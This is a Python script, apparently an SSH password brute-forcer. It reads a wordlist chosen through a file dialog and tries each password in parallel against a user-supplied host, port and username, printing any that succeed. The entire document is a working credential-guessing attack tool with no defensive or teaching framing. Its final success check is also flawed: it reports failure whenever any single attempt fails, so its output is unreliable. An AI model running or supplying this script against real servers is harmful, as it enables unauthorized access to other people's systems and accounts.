import paramiko
import tkinter as tk
from tkinter import filedialog
from multiprocessing import Pool

def ssh_connect(args):
    password, hostname, port, username = args
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname, port, username, password)
        print("Connection successful! Password:", password)
        return password
    except paramiko.AuthenticationException:
        print("Incorrect password:", password)
        return None
    except paramiko.SSHException as e:
        print("An error occurred while establishing SSH connection:", e)
        return None
    finally:
        client.close()

if __name__ == "__main__":
    # Create a Tkinter root window
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    # Ask the user to select the password file
    file_path = filedialog.askopenfilename(title="Select Password File")
    if not file_path:
        print("No file selected. Exiting.")
        exit()

    # Prompt user for connection details
    hostname = input("Host name: ")
    port = int(input("Port: "))
    username = input("User name: ")

    # Read passwords from the selected file
    with open(file_path, "r") as password_file:
        password_list = [password.strip() for password in password_file]

    # Prepare arguments for parallel processing
    args_list = [(password, hostname, port, username) for password in password_list]

    with Pool() as pool:
        results = pool.map(ssh_connect, args_list)

    if None in results:
        print("Failed to find valid password.")
    else:
        print("Password found!")
